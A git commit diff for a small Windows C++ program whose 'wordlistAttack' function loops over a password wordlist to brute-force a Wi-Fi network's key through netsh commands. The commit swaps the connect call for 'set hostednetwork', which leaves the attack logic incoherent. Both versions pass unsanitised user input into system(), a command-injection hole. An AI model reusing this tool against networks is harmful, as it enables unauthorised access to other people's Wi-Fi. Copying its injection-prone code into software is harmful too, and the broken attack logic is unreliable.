b91676447ab420c8169ce12e9a8786f4db538a11
Fhchcjcjcjcjvkkvk <info@infopeklo.cz>
2025-02-23 15:04:25 +0100

    Update and rename wifi.cpp to wifis.cpp

--- wifis.cpp
+++ wifis.cpp
@@ -4,9 +4,10 @@
 #include <vector>
 #include <windows.h>
 
-void connectToWifi(const std::string& ssid, const std::string& password) {
-    std::string command = "netsh wlan connect name=\"" + ssid + "\" ssid=\"" + ssid + "\" key=\"" + password + "\"";
+void startHostedNetwork(const std::string& ssid, const std::string& password) {
+    std::string command = "netsh wlan set hostednetwork mode=allow ssid=\"" + ssid + "\" key=\"" + password + "\"";
     system(command.c_str());
+    std::cout << "Hosted network started with SSID: " << ssid << " and password: " << password << std::endl;
 }
 
 void wordlistAttack(const std::string& ssid, const std::string& bssid, const std::string& wordlistPath) {
@@ -14,7 +15,7 @@ void wordlistAttack(const std::string& ssid, const std::string& bssid, const std
     std::string password;
     while (getline(wordlist, password)) {
         std::cout << "Trying password: " << password << std::endl;
-        connectToWifi(ssid, password);
+        startHostedNetwork(ssid, password);
         Sleep(5000); // Wait for 5 seconds before trying the next password
     }
 }
@@ -30,7 +31,7 @@ void menu() {
         std::cin >> ssid;
         std::cout << "ENTER PWD: ";
         std::cin >> password;
-        connectToWifi(ssid, password);
+        startHostedNetwork(ssid, password);
     } else if (mode == "BF") {
         std::cout << "ENTER SSID: ";
         std::cin >> ssid;
